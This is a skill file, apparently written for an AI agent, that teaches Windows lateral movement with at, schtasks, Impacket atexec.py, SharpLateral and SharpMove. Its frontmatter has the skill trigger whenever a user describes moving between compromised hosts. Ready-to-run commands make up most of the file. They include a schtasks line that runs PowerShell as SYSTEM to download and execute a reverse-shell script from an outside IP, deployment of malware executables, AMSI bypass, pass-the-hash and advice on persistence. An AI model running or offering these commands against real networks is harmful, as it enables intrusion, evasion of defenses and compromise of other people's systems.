---
name: windows-lateral-movement
description: How to perform lateral movement between Windows hosts using AtExec and SchtasksExec techniques. Use this skill whenever the user mentions lateral movement, remote command execution, Windows domain pivoting, moving between hosts, executing commands on remote Windows systems, or any scenario involving authenticated access to multiple Windows machines. Trigger even if the user doesn't explicitly say "lateral movement" but describes moving from one compromised host to another.
---

# Windows Lateral Movement: AtExec & SchtasksExec

This skill covers techniques for executing commands on remote Windows hosts when you have valid credentials. These methods are essential for moving laterally through a Windows environment after initial compromise.

## When to Use These Techniques

Use these lateral movement methods when:
- You have valid credentials (username/password or NTLM hash) for a target Windows host
- You need to execute commands on a remote system without establishing a full shell
- You're pivoting through a Windows domain environment
- You want to maintain persistence on remote systems
- You need to deploy payloads or tools to other hosts

## Prerequisites

- Valid credentials for the target system (username/password or NTLM hash)
- Network connectivity to the target (typically ports 135, 445, 139)
- Appropriate permissions (usually administrative or SYSTEM)
- Knowledge of target hostname/IP and domain (if applicable)

## Technique 1: Native Windows AT Command

The `at` command schedules tasks on remote Windows hosts. Note: This feature is deprecated in newer Windows versions but may still work on legacy systems.

### Basic Syntax

```cmd
at \\target_host 11:00:00PM command_to_execute
```

### Example

```cmd
at \\victim 11:00:00PM shutdown -r
```

**Important:** The `at` service must be running on the target, and this method is unreliable on modern Windows systems.

## Technique 2: Schtasks (Recommended)

`schtasks` is the modern replacement for `at` and is more reliable across Windows versions.

### Two-Step Process

1. **Create the scheduled task**
2. **Execute the task immediately**

### Basic Syntax

```cmd
schtasks /create /n <TASK_NAME> /tr <COMMAND> /sc once /st 00:00 /S <TARGET> /RU <USER>
schtasks /run /tn <TASK_NAME> /S <TARGET>
```

### Parameters

| Parameter | Description |
|-----------|-------------|
| `/n` | Task name |
| `/tr` | Command to execute |
| `/sc` | Schedule type (once, daily, weekly, etc.) |
| `/st` | Start time (HH:MM) |
| `/S` | Target server |
| `/RU` | Run as user (e.g., `System`, `NT AUTHORITY\SYSTEM`) |
| `/rp` | Run as password |

### Example: Execute Executable

```cmd
schtasks /create /n "MyTask" /tr C:\path\executable.exe /sc once /st 00:00 /S victim.domain.local /RU System
schtasks /run /tn "MyTask" /S victim.domain.local
```

### Example: PowerShell Payload

```cmd
schtasks /create /S dcorp-dc.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```

### Example: With Password

```cmd
schtasks /create /n "TaskName" /tr "C:\windows\temp\payload.exe" /sc once /st 00:00 /S target.host.local /RU "domain\\user" /rp "password"
schtasks /run /tn "TaskName" /S target.host.local
```

## Technique 3: Impacket atexec.py

Use Impacket's `atexec.py` for remote command execution when you have credentials. This is often more reliable than native commands.

### Basic Syntax

```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' 'command'
```

### Examples

```bash
# Using password
atexec.py 'CORP'/'admin':'P@ssw0rd123'@'192.168.1.100' whoami

# Using NTLM hash
atexec.py 'CORP'/'admin':'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'@'192.168.1.100' 'ipconfig /all'

# With domain controller
atexec.py 'CORP'/'admin':'password'@'dc.corp.local' 'net user'
```

### Advantages

- Works with password or NTLM hash
- No need to create and run tasks separately
- Cleaner output
- Part of the Impacket suite (widely available)

## Technique 4: SharpLateral

SharpLateral is a .NET tool for lateral movement via scheduled tasks.

### Basic Syntax

```bash
SharpLateral.exe schedule HOSTNAME C:\path\to\payload.exe TaskName
```

### Example

```bash
SharpLateral.exe schedule REMOTE-PC C:\Users\Administrator\Desktop\malware.exe MyTask
```

### Features

- Compiled .NET executable (no dependencies)
- Simple syntax
- Good for quick lateral movement

## Technique 5: SharpMove

SharpMove is another .NET lateral movement tool with AMSI bypass capabilities.

### Basic Syntax

```bash
SharpMove.exe action=taskscheduler computername=<TARGET> command="<COMMAND>" taskname=<NAME> amsi=<true|false> username=<USER> password=<PASS>
```

### Example

```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```

### Parameters

| Parameter | Description |
|-----------|-------------|
| `action` | `taskscheduler` for scheduled task execution |
| `computername` | Target hostname |
| `command` | Command to execute |
| `taskname` | Name of the scheduled task |
| `amsi` | Enable AMSI bypass (`true`/`false`) |
| `username` | Credentials (domain\\user format) |
| `password` | Password |

## Technique Selection Guide

| Scenario | Recommended Tool |
|----------|------------------|
| Quick command execution | Impacket atexec.py |
| Persistence needed | Schtasks |
| No Impacket available | SharpLateral or SharpMove |
| AMSI bypass needed | SharpMove (amsi=true) |
| Legacy Windows systems | AT command |
| PowerShell payloads | Schtasks with PowerShell command |

## Best Practices

1. **Use unique task names** to avoid conflicts and make cleanup easier
2. **Clean up after yourself** - remove scheduled tasks when done:
   ```cmd
   schtasks /delete /tn "TaskName" /S target /f
   ```
3. **Test with simple commands first** (e.g., `whoami`, `hostname`)
4. **Consider detection** - scheduled task creation is often logged
5. **Use SYSTEM context** when possible for maximum privileges
6. **Quote paths with spaces** properly

## Related Techniques

- **Silver Tickets**: Can be used with schtasks for authentication bypass
- **PsExec**: Alternative lateral movement tool
- **WMI**: Another method for remote execution
- **WinRM**: PowerShell Remoting for lateral movement

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Access denied | Verify credentials and permissions |
| Task creation fails | Check if Task Scheduler service is running |
| Command doesn't execute | Verify path exists on target, check syntax |
| Network timeout | Verify connectivity (ports 135, 445, 139) |
| Hash not working | Ensure hash format is correct (LM:NTLM) |

## Quick Reference

```bash
# Impacket atexec (fastest)
atexec.py 'DOMAIN'/'USER':'PASS'@'TARGET' 'command'

# Schtasks (most reliable)
schtasks /create /n "Task" /tr "command" /sc once /st 00:00 /S TARGET /RU System
schtasks /run /tn "Task" /S TARGET

# Cleanup
schtasks /delete /tn "Task" /S TARGET /f
```

## Notes

- These techniques require **authenticated access** - they are not for unauthenticated exploitation
- Always verify you have **authorization** before using these techniques
- Scheduled task creation is **highly visible** in Windows Event Logs
- Consider the **operational security** implications of each method
- Some EDR solutions may detect and block these techniques
